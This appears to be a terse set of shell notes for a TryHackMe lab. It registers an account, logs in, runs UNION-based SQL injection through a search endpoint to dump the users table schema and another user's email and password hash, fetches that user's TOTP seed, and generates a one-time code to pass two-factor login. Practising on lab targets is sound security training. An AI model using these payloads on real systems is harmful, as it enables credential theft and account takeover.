```
cat payload.json
{
  "username": "jalil",
  "email": "jalil@thm.thm",
  "password": "TestPass123!",
  "name": "Test User",
  "age": 30,
  "bio": "hi"
}
```
```
curl -i -X POST   -H "Content-Type: application/json"   -H "Accept: application/json"   --data-binary @payload.json   "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/register"
```

```
cat login.json
{
  "username": "jalil",
  "password": "TestPass123!"
}
```

```
curl -i -X POST   -H "Content-Type: application/json"   -H "Accept: application/json"   --data-binary @login.json   "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/login"
```

```
export TOKEN=""
```

```
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/membership"
```

```
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/profile"
```
```
BASE="https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com"
```

```
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com/search?q=')%20UNION%20SELECT%201,sql,'null',0,'null',0%20FROM%20sqlite_master%20WHERE%20tbl_name='users'%20%2F%2A"
```

```
curl -sG -H "Authorization: Bearer $TOKEN1"   --data-urlencode "q=') AND 1=2 UNION SELECT id, username, name, age, email, is_premium FROM users WHERE email='shadow777@thm.thm' /*"   "$BASE/search"
```

```
curl -sG -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=') AND 1=2 UNION SELECT id, username, email, 0, password_hash, 0 FROM users WHERE email='shadow777@thm.thm' /*" \
  "$BASE/search"
```

```
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary '{"user_id":48}' \
  "$BASE/getseed"
```

```
OTP=$(python3 - <<'PY'
import pyotp
seed=""
print(pyotp.TOTP(seed).now())
PY
)

curl -s -X POST -H "Content-Type: application/json" \
  --data-binary "{\"temp_token\":\"$TEMP\",\"otp_code\":\"$OTP\",\"device_fingerprint\":null}" \
  "$BASE/verify-otp"
echo
```
